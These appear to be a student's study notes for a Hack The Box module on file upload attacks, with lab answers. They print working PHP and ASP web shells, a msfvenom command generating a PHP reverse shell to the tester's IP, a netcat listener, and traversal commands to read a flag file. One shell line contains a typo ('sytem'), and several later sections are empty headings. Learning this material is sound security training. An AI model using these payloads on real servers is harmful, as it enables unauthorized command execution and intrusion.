# Intro

## Intro

File uploads are a huge part of current web apps. Many apps allow a profile photo upload, or you might be able to upload documents like PDFs. However with this prevalence comes the risk of potential attacks.

File upload attacks are among the most common found vulnerabilities. And they are usually rated high or critical. Without proper validation, it can be possible to gain remote command execution on a server, or introduce other vulnerabilities. 

# Basic Exploitation

## Absent Validation

The first and most dangerous form of upload vuln, is absent validation. In this form we can upload any file type without restriction. If we cna identify what programming language is being run on the backend server we can possibly gain remote code execution.

One way to determine what language is being run on the backend is to check the index.[file extension] on the current page. We have done this in the past to fuzz for the server type. But this will not always be accurate, as sometimes they web app may not use index pages, or may use more than one web extension.

We can also use something like `https://www.wappalyzer.com/`, which is a browser extension that will tell you the backend server information.

If we do find a web page that seems to have no validation, the first thing we can do is test and see if there is any input validation by running something like `<?php echo "Hello HTB";?>` and visiting the resulting web page to see if it is displayed.

The question in this section is:
Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.

Uploading a file containing:
``` PHP
<?php $var = gethostname(); echo $var;?>
```
Gets the answer.

## Upload Exploitation

After we find a vulnerable web app, we can attempt to get a web shell by uploading a malicious script. One good example of this is `https://github.com/Arrexel/phpbash` which is a php bash script.

But there are many more that we can find in SecLists. If we look in SecLists/Web-Shells we can find lots of web shells for all languages.

There is also a chance that we won't have access to online resources like these (for instance in a pen test), so knowing how to write a basic web shell is good. 

For PHP, uploading a file with:
``` PHP
<?php system($_REQUEST['cmd']); ?>
```
Will give command execution. The system() command runs system commands. And we can pass in a command using a get paramater (e.g. ?cmd=id).

Similarly we can do the same thing in ASP with:
``` ASP
<% eval request('cmd') %>
```

Now lets look at how we can get a reverse shell. First lets get a reverse shell script in PHP from `https://github.com/pentestmonkey/php-reverse-shell`

Once we copy this file over, we need to update the IP to ours and the port to the desired port. 

Then we can start a netcat listener, upload the file, and visit the page and it should work.

Like web shells, reverse shells may not always be easily accessible, and these are less easy to remember. Luckily we can use the msvenom to generate a reverse shell script.

We can generate a reverse shell for php using msvenom like:
`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

Then we can listen with netcat like:
`nc -lvnp OUR_PORT`

The question in this section is:
 Try to exploit the upload feature to upload a web shell and get the content of /flag.txt 

I uploaded the web shell we downloaded above and visited the page.

Then I ran:
```
ls

ls ..

ls ../../

ls ../../../

ls ../../../../

cat ../../../../flag.txt
```

# Bypassing Filters

## Client-Side Validation

Lots of web apps only perform input validation on the front end. However, this is easily bypassed by directly interacting with the server. Or we can modify the front-end code using the browsers dev tools.

If there is front-end validation that we need to deal with, we can intercept the request using Zap or Burp. Then we can select a valid formatted file, and before uploading, change the file to the one we really want. That will allow us to bypass the client-side validation.

The other option for bypassing this validation is to go into the dev tools and inspect the code that is checking the validation. We notice in the example in this section it is simply running a script to validate the extension of the file being uploaded. So we can simply modify this code to either allow our php extension or remove the check entirely.

The question in this seciton is:
Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice) 

To get this I intercepted the upload on Burp and uploaded a file called shell.php with:
`<?php sytem($_REQUEST['cmd']); ?>` in the content.

Then I ran the same set of commands as above and got the answer.

## Blacklist Filters

## Whitelist Filters

## Type Filters

# Other Upload Attacks

## Limited File Uploads

## Out Upload Attacks

# Prevention

## Prevention

# Skill Assessment

## Skills Assessment
